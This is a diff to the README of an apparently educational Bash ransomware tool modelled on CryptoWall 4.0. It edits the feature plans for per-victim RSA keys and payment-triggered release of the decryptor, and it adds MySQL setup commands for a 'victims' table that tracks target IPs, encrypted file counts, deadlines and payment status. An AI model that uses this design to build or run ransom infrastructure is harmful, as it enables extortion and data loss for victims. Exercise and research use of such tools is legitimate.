@@ -18,8 +18,6 @@
 ## Feature Requests
  - Filename encryption (Modeled after CryptoWall 4.0) - In Work
  - Unique RSA key-pair per victim
- - Update payment page: If payment is received, provide two delay, then automatically release BashDecrypt (decrypto.sh and the private key in a unique directory)
- - Update Ransom message on host to relfect CryptoWall 4.0 (Update .txt version and include a .html version)
  - More features will go here...
 
 ## Notes
@@ -65,7 +63,7 @@
  - $ mysql -u [user] -p
  - $ create database victims;
  - $ use victims;
- - $ create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), file_count int not null, curr_time timestamp not null, exp_time timestamp not null, time_expired bool not null, paid bool not null);
+ - $ create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), file_count int not null, curr_time timestamp not null, exp_time timestamp not null, time_expired bool not null, paid bool not null, paid_count timestamp not null);
  - $ exit
 
 ## What to do on the client-side
@@ -97,6 +95,7 @@
   - CryptoWall 3.0 Writeup: http://www.sentinelone.com/blog/anatomy-of-cryptowall-3-0-a-look-inside-ransomwares-tactics/
   - Chimera Ransomware: https://threatpost.com/chimera-ransomware-promises-to-publish-encrypted-data-online/115293/
   - CryptoWall 4.0: http://securityaffairs.co/wordpress/41718/cyber-crime/cryptowall-4-0-released.html
+  - CryptoWall 4.0 DECRYPT.html: http://www.bleepstatic.com/images/news/ransomware/cryptowall/v4/note-part-1.jpg
 
 ## WARNING 
   - Use this tool at your own risk. Author is not responsible or liable if you damage your own system or others. Follow all local, state, federal, and international laws as it pertains to your geographic location. Do NOT use this tool maliciously as it is being released for educational purposes. This tools intended use is in cyber exercises or demonstrations of adversarial tools.
